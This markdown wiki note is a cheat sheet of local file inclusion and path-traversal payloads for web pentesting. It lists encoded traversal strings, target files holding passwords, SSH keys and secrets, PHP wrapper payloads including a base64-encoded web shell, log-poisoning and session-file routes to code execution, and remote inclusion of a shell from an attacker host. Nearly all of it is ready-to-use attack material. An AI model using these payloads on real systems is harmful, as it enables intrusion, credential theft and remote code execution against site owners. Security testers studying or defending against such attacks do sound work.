---
summary: LFI/path-traversal payloads — traversal, target files, PHP wrappers, and LFI→RCE routes.
status: active
tags: [security, payloads, lfi, web]
private: false
---

# LFI / Path Traversal Payloads

Source: [PayloadsAllTheThings/File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) + [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion). Use `curl --path-as-is` so the client doesn't normalize the `../`.

## Traversal

```
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd            # filter strips one ../, this survives
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL-encoded
?page=%252e%252e%252fetc%252fpasswd            # double-encoded
?page=../../../etc/passwd%00                    # null byte (PHP < 5.3.4)
```

## Target files

- **Linux**: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/proc/self/cmdline`, `~/.ssh/id_rsa`, `/var/log/apache2/access.log`, app config/`.env`
- **Windows**: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config`, `C:\Windows\System32\config\SAM`

## PHP wrappers (the high-value part)

```
php://filter/convert.base64-encode/resource=index.php     # read source (decode the b64)
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==   # data:// = <?php system($_GET[0]);?>
php://input                                                 # POST body as PHP (needs POST + allow_url_include)
expect://id                                                 # if expect ext loaded
zip://shell.jpg%23shell.php                                 # phar/zip wrappers
```

## LFI → RCE routes

- **Log poisoning**: inject `<?php system($_GET[0]);?>` into `User-Agent` → include `/var/log/apache2/access.log?0=id`.
- **/proc/self/environ**: poison via `User-Agent`, then include it (older setups).
- **PHP session files**: write PHP into a session value → include `/var/lib/php/sessions/sess_<PHPSESSID>`.
- **Mail / upload / SSH auth.log**: any file you control the contents of + can include.

## Remote file inclusion (if `allow_url_include=On`)

```
?page=http://LHOST/shell.txt
?page=\\LHOST\share\shell.php     # Windows UNC
```

## Related

- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Web Application Testing](kb://11-security-playbook-web-app-testing)
